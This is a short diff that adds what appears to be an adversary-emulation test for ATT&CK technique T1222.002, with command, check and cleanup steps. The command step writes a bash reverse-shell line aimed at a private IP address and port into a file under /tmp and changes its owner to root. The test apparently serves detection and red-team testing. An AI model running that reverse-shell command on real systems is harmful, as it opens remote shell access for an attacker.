@@ -1,0 +1,9 @@
+Elevation Required;
+#command
+touch /tmp/T1222.002
+echo "sh -i >& /dev/tcp/10.10.21.106/9001 0>&1" > /tmp/T1222.002
+chown root:root /tmp/T1222.002
+#check
+ls -l /tmp/T1222.002
+#cleanup
+rm -f /tmp/T1222.002
